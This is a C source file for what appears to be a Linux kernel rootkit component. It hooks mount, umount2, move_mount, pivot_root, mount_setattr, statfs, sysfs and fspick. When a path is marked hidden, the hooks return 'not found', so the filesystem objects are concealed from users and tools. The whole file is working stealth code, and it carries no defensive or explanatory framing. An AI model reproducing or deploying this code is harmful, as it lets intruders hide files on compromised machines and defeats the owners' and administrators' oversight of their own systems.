#include "files.h"
#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/mount.h>
#include <linux/namei.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <uapi/asm-generic/statfs.h>
#include <uapi/linux/mount.h>

#define FSMOUNT_VALID_FLAGS                                                         \
    (MOUNT_ATTR_RDONLY | MOUNT_ATTR_NOSUID | MOUNT_ATTR_NODEV | MOUNT_ATTR_NOEXEC | \
     MOUNT_ATTR__ATIME | MOUNT_ATTR_NODIRATIME | MOUNT_ATTR_NOSYMFOLLOW)
#define MOUNT_SETATTR_VALID_FLAGS       (FSMOUNT_VALID_FLAGS | MOUNT_ATTR_IDMAP)
#define MOUNT_SETATTR_PROPAGATION_FLAGS (MS_UNBINDABLE | MS_PRIVATE | MS_SLAVE | MS_SHARED)

// sys_mount syscall hook handler
SYSCALL_HOOK_HANDLER5(mount, orig_mount, p_regs, char __user *, s_dev_name, char __user *,
                      s_dir_name, char __user *, s_type, unsigned long, ui64_flags, void __user *,
                      p_data)
{
    pr_dev_info("mount(%p, %p, %p, %#lx, %p)\n", s_dev_name, s_dir_name, s_type, ui64_flags,
                p_data);

    // Check if the target directory is hidden
    if (is_pathname_hidden(AT_FDCWD, s_dir_name, LOOKUP_FOLLOW)) {
        return -ENOENT;
    }

    return do_check_hidden(orig_mount, p_regs, AT_FDCWD, s_dev_name, 0);
}

// sys_umount2 syscall hook handler
SYSCALL_HOOK_HANDLER2(umount2, orig_umount2, p_regs, char __user *, s_name, int, i32_flags)
{
    pr_dev_info("umount2(%p, %s%#x)\n", s_name, SIGNED_ARG(i32_flags));

    IF_U (i32_flags & ~(MNT_FORCE | MNT_DETACH | MNT_EXPIRE | UMOUNT_NOFOLLOW)) {
        return -EINVAL;
    }

    return do_check_hidden(orig_umount2, p_regs, AT_FDCWD, s_name,
                           i32_flags & UMOUNT_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_move_mount syscall hook handler
SYSCALL_HOOK_HANDLER5(move_mount, orig_move_mount, p_regs, int, i32_from_dfd, char __user *,
                      s_from_pathname, int, i32_to_dfd, char __user *, s_to_pathname, unsigned int,
                      ui32_flags)
{
    unsigned int ui32_lflags = 0;

    pr_dev_info("move_mount(%d, %p, %d, %p, %#x)\n", i32_from_dfd, s_from_pathname, i32_to_dfd,
                s_to_pathname, ui32_flags);

    IF_U (ui32_flags & ~MOVE_MOUNT__MASK) {
        return -EINVAL;
    }

    if (ui32_flags & MOVE_MOUNT_F_SYMLINKS) {
        ui32_lflags |= LOOKUP_FOLLOW;
    }
    if (ui32_flags & MOVE_MOUNT_F_EMPTY_PATH) {
        ui32_lflags |= LOOKUP_EMPTY;
    }

    if (is_pathname_hidden(i32_from_dfd, s_from_pathname, ui32_lflags)) {
        return -ENOENT;
    }

    ui32_lflags = 0;
    if (!(ui32_flags & MOVE_MOUNT_T_SYMLINKS)) {
        ui32_lflags |= AT_SYMLINK_NOFOLLOW;
    }
    if (ui32_flags & MOVE_MOUNT_T_EMPTY_PATH) {
        ui32_lflags |= AT_EMPTY_PATH;
    }

    return do_check_hidden(orig_move_mount, p_regs, i32_to_dfd, s_to_pathname, ui32_lflags);
}

// sys_pivot_root syscall hook handler
SYSCALL_HOOK_HANDLER2(pivot_root, orig_pivot_root, p_regs, const char __user *, s_new_root,
                      const char __user *, s_put_old)
{
    pr_dev_info("pivot_root(%p, %p)\n", s_new_root, s_put_old);

    if (is_pathname_hidden(AT_FDCWD, s_put_old, LOOKUP_FOLLOW)) {
        return -ENOENT;
    }

    return do_check_hidden(orig_pivot_root, p_regs, AT_FDCWD, s_new_root, 0);
}

// sys_mount_setattr syscall hook handler
SYSCALL_HOOK_HANDLER5(mount_setattr, orig_mount_setattr, p_regs, int, i32_dfd, const char __user *,
                      s_path, unsigned int, ui32_flags, struct mount_attr __user *, p_uattr, size_t,
                      sz_usize)
{
    int i32_err;
    struct mount_attr attr;

    pr_dev_info("mount_setattr(%d, %p, %#x, %p, %zu)\n", i32_dfd, s_path, ui32_flags, p_uattr,
                sz_usize);

    // Use same checks as in fs/namespace.c:4269

    if (ui32_flags & ~(AT_EMPTY_PATH | AT_RECURSIVE | AT_SYMLINK_NOFOLLOW | AT_NO_AUTOMOUNT)) {
        return -EINVAL;
    }

    IF_U ((sz_usize > PAGE_SIZE)) {
        return -E2BIG;
    }

    IF_U (sz_usize < MOUNT_ATTR_SIZE_VER0) {
        return -EINVAL;
    }

    if (!may_mount()) {
        return -EPERM;
    }

    i32_err = copy_struct_from_user(&attr, sizeof(attr), p_uattr, sz_usize);
    if (i32_err) {
        return i32_err;
    }

    if (attr.attr_set == 0 && attr.attr_clr == 0 && attr.propagation == 0) {
        return 0;
    }

    if (attr.propagation & ~MOUNT_SETATTR_PROPAGATION_FLAGS) {
        return -EINVAL;
    }

    if (hweight32(attr.propagation & MOUNT_SETATTR_PROPAGATION_FLAGS) > 1) {
        return -EINVAL;
    }

    if ((attr.attr_set | attr.attr_clr) & ~MOUNT_SETATTR_VALID_FLAGS) {
        return -EINVAL;
    }

    return do_check_hidden(orig_mount_setattr, p_regs, AT_FDCWD, s_path, ui32_flags);
}

// sys_statfs syscall hook handler
SYSCALL_HOOK_HANDLER2(statfs, orig_statfs, p_regs, const char __user *, s_pathname,
                      struct statfs __user *, p_buf)
{
    pr_dev_info("statfs(%p, %p)\n", s_pathname, p_buf);

    return do_check_hidden(orig_statfs, p_regs, AT_FDCWD, s_pathname, 0);
}

// sys_sysfs syscall hook handler
SYSCALL_HOOK_HANDLER3(sysfs, orig_sysfs, p_regs, int, i32_option, unsigned long, ui64_arg1,
                      unsigned long, ui64_arg2)
{
    pr_dev_info("sysfs(%d, %lu, %lu)\n", i32_option, ui64_arg1, ui64_arg2);

    switch (i32_option) {
    case 1:
        return do_check_hidden(orig_sysfs, p_regs, AT_FDCWD, (const char __user *)ui64_arg1, 0);
        break;

    case 2:
    case 3:
        return orig_sysfs(p_regs);

    default:
        return -EINVAL;
    }
}

// sys_fspick syscall hook handler
SYSCALL_HOOK_HANDLER3(fspick, orig_fspick, p_regs, int, i32_dfd, const char __user *, s_path,
                      unsigned int, ui32_flags)
{
    int i32_at_flags = 0;

    pr_dev_info("fspick(%d, %p, %#x)\n", i32_dfd, s_path, ui32_flags);

    IF_U ((ui32_flags & ~(FSPICK_CLOEXEC | FSPICK_SYMLINK_NOFOLLOW | FSPICK_NO_AUTOMOUNT |
                          FSPICK_EMPTY_PATH)) != 0) {
        return -EINVAL;
    }

    if (ui32_flags & FSPICK_SYMLINK_NOFOLLOW) {
        i32_at_flags |= AT_SYMLINK_NOFOLLOW;
    }

    if (ui32_flags & FSPICK_EMPTY_PATH) {
        i32_at_flags |= AT_EMPTY_PATH;
    }

    return do_check_hidden(orig_fspick, p_regs, i32_dfd, s_path, i32_at_flags);
}
